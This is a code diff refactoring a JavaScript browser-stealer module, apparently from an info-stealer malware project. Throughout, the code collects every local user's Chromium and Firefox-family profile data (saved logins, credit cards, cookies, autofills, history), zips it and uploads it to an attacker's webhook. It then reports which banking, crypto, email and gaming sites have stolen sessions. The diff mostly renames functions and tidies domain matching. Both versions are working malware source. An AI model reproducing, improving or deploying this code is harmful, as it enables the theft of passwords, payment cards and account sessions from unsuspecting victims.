@@ -31,10 +31,10 @@ const BrowserStats = structures.BrowserStatistics;
 
 const Chromiumbrowsers = async () => {
     const profiles = [];
-    const users = await hardware.getUsers();
+    const users = await hardware.GetUsers();
 
     for (const user of users) {
-        for (const [name, relativePath] of Object.entries(browsersPaths.getChromiumBrowsers())) {
+        for (const [name, relativePath] of Object.entries(browsersPaths.GetChromiumBrowsers())) {
             const fullPath = path.join(user, relativePath);
 
             if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
@@ -47,9 +47,9 @@ const Chromiumbrowsers = async () => {
                 user: user.split(path.sep)[2]
             };
 
-            BrowserStats.addUsers(user);
+            BrowserStats.AddUsers(user);
 
-            let profilePaths = browsersProfiles.getChromiumProfiles(fullPath, name).map(profile => ({
+            let profilePaths = browsersProfiles.GetChromiumProfiles(fullPath, name).map(profile => ({
                 ...profile,
                 browser: browser
             }));
@@ -82,10 +82,10 @@ const Chromiumbrowsers = async () => {
 
 const Geckobrowsers = async () => {
     const profiles = [];
-    const users = await hardware.getUsers();
+    const users = await hardware.GetUsers();
 
     for (const user of users) {
-        for (const [name, relativePath] of Object.entries(browsersPaths.getGeckoBrowsers())) {
+        for (const [name, relativePath] of Object.entries(browsersPaths.GetGeckoBrowsers())) {
             const fullPath = path.join(user, relativePath);
 
             if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
@@ -98,7 +98,7 @@ const Geckobrowsers = async () => {
                 user: user.split(path.sep)[2]
             };
 
-            let profilePaths = browsersProfiles.getGeckoProfiles(fullPath, name).map(profile => ({
+            let profilePaths = browsersProfiles.GetGeckoProfiles(fullPath, name).map(profile => ({
                 ...profile,
                 browser: browser
             }));
@@ -127,7 +127,7 @@ const Geckobrowsers = async () => {
     return profiles
 };
 
-const browsersStealer = async (webhookUrl) => {
+const BrowsersStealer = async (webhookUrl) => {
     const profiles = [...await Chromiumbrowsers(), ...await Geckobrowsers()]
 
     if (profiles.length === 0) {
@@ -136,7 +136,9 @@ const browsersStealer = async (webhookUrl) => {
 
     const browserTempDir = path.join(os.tmpdir(), 'browsers-temp');
     for (const profile of profiles) {
-        const destBrowser = path.join(browserTempDir, profile.browser.user, profile.browser.name, profile.profile);
+        const destBrowser = path.join(
+            browserTempDir, profile.browser.user, profile.browser.name, profile.profile
+        );
 
         if (!fs.existsSync(destBrowser)) {
             fs.mkdirSync(destBrowser, { recursive: true })
@@ -158,7 +160,7 @@ const browsersStealer = async (webhookUrl) => {
         browsers.cookies.push({ ...profileInfo, cookies: profile?.cookies || [] });
     }
 
-    BrowserStats.updateStatistics(
+    BrowserStats.UpdateStatistics(
         browsers.downloads.reduce((acc, { downloads }) => acc + downloads?.length, 0),
         browsers.historys.reduce((acc, { historys }) => acc + historys?.length, 0),
         browsers.bookmarks.reduce((acc, { bookmarks }) => acc + bookmarks?.length, 0),
@@ -169,137 +171,114 @@ const browsersStealer = async (webhookUrl) => {
     );
 
     for (const { browserTempPath, downloads } of browsers.downloads) {
-        await fileutil.writeDataToFile(browserTempPath, `downloads.txt`, downloads)
+        await fileutil.WriteDataToFile(browserTempPath, `downloads.txt`, downloads)
     };
 
     for (const { browserTempPath, historys } of browsers.historys) {
-        await fileutil.writeDataToFile(browserTempPath, `historys.txt`, historys)
+        await fileutil.WriteDataToFile(browserTempPath, `historys.txt`, historys)
     };
 
     for (const { browserTempPath, bookmarks } of browsers.bookmarks) {
-        await fileutil.writeDataToFile(browserTempPath, `bookmarks.txt`, bookmarks)
+        await fileutil.WriteDataToFile(browserTempPath, `bookmarks.txt`, bookmarks)
     };
 
     for (const { browserTempPath, autofills } of browsers.autofills) {
-        await fileutil.writeDataToFile(browserTempPath, `autofills.txt`, autofills)
+        await fileutil.WriteDataToFile(browserTempPath, `autofills.txt`, autofills)
     };
 
     for (const { browserTempPath, logins } of browsers.logins) {
-        await fileutil.writeDataToFile(browserTempPath, `logins.txt`, logins)
+        await fileutil.WriteDataToFile(browserTempPath, `logins.txt`, logins)
     };
 
     for (const { browserTempPath, creditcards } of browsers.creditcards) {
-        await fileutil.writeDataToFile(browserTempPath, `credit_cards.txt`, creditcards)
+        await fileutil.WriteDataToFile(browserTempPath, `credit_cards.txt`, creditcards)
     };
 
     for (const { browserTempPath, browser, cookies } of browsers.cookies) {
-        await fileutil.writeDataToFile(browserTempPath, `cookies_${browser.toLowerCase()}.txt`, cookies)
+        await fileutil.WriteDataToFile(browserTempPath, `cookies_${browser.toLowerCase()}.txt`, cookies)
     };
 
     const browserTempZip = path.join(os.tmpdir(), 'browsers.zip');
+
     try {
-        await fileutil.zipDirectory({
+        await fileutil.ZipDirectory({
             inputDir: browserTempDir,
             outputZip: browserTempZip
         });
 
-        await requests.webhook(webhookUrl, {
+        await requests.Webhook(webhookUrl, {
             embeds: [{
                 title: 'Browsers',
-                description: '```' + fileutil.tree(browserTempDir) + '```',
+                description: '```' + fileutil.Tree(browserTempDir) + '```',
             }]
         }, [browserTempZip]);
 
         const WishTempDir = fileutil.WishTempDir('browsers');
-        await fileutil.copy(browserTempDir, WishTempDir);
+        await fileutil.Copy(browserTempDir, WishTempDir);
 
         [browserTempDir, browserTempZip].forEach(async dir => {
-            await fileutil.removeDir(dir);
+            await fileutil.RemoveDir(dir);
         });
     } catch (error) {
         console.error(error);
     }
 };
 
-const keywordsFound = async (webhookUrl) => {
-    const sites = [
+const KeywordsFound = async (webhookUrl) => {
+    const sites = new Set([
         "replit", "hostinger", "cloudflare", "origin", "amazon", "twitter", "aliexpress", "netflix",
         "roblox", "twitch", "facebook", "riotgames", "card", "github", "telegram", "protonmail", "gmail",
         "youtube", "onoff", "xss.is", "pronote", "ovhcloud", "nulled", "cracked", "tiktok", "yahoo", "gmx",
         "aol", "coinbase", "binance", "steam", "epicgames", "discord", "paypal", "instagram", "spotify",
         "onlyfans", "pornhub",
-    ];
+    ]);
 
-    let logins = new Set();
-    let cookies = new Set();
+    const logins = new Set();
+    const cookies = new Set();
 
-    [...structures.BrowserStatistics.sites]
-        .forEach(x => {
-            const url = x.origin_url;
-            const match = url.match(/(?:https?:\/\/)?(?:www\.)?(\.?([^\/]+))?(.*)/);
+    structures.BrowserStatistics.sites.forEach(({ origin_url, source }) => {
+        const match = origin_url.match(/(?:https?:\/\/)?(?:www\.)?([^\/]+)(.*)/);
 
-            if (match) {
-                const parts = match[2]?.split('.') || [];
-                const domain = parts.length > 1
-                    ? parts[parts.length - 2] + '.' + parts[parts.length - 1]
-                    : parts[0];
+        if (match) {
+            const domain = match[1].split('.').slice(-2).join('.');
 
-                if (sites.some(site => domain.includes(site))) {
-                    switch (x.source) {
-                        case 'logins':
-                            logins.add(domain);
-                            break;
-                        case 'cookies':
-                            cookies.add(domain);
-                            break;
-                    }
-                }
+            if (sites.has(domain)) {
+                (source === 'logins' ? logins : cookies).add(domain);
             }
-        });
+        }
+    });
 
-    logins = Array.from(logins);
-    cookies = Array.from(cookies);
+    const Field = (name, items) => items.size > 0 && {
+        name: name,
+        value: Array.from(items).map(x => `[${x}](https://${x})`).join(', '),
+        inline: false,
+    };
 
     try {
-        if (logins.length > 0 || cookies.length > 0) {
-            const data = {
+        const fields = ['Logins', 'Cookies']
+            .map((label, index) => Field(label, index === 0
+                ? logins
+                : cookies
+            ))
+            .filter(Boolean);
+
+        if (fields.length) {
+            await requests.Webhook(webhookUrl, {
                 embeds: [{
                     title: 'Keywords',
-                    fields: [],
+                    fields: fields
                 }]
-            };
-
-            if (logins.length > 0) {
-                data.embeds[0].fields.push({
-                    name: 'Logins',
-                    value: logins
-                        .map(x => '[`' + x + '`](https://' + x + ')')
-                        .join(', '),
-                    inline: false
-                });
-            };
-
-            if (cookies.length > 0) {
-                data.embeds[0].fields.push({
-                    name: 'Cookies',
-                    value: cookies
-                        .map(x => '[`' + x + '`](https://' + x + ')')
-                        .join(', '),
-                    inline: false
-                });
-            };
-
-            await requests.webhook(webhookUrl, data);
-        };
+            });
+        }
     } catch (error) {
         console.error(error);
     }
 };
 
-const sessionsFound = require('./sessions.js');
+const SessionsFound = require('./sessions.js');
 
 module.exports = async (webhookUrl) => {
-    await browsersStealer(webhookUrl);
-    await keywordsFound(webhookUrl);
-    await sessionsFound(webhookUrl);
+    await BrowsersStealer(webhookUrl);
+    await KeywordsFound(webhookUrl);
+    await SessionsFound(webhookUrl);
 };
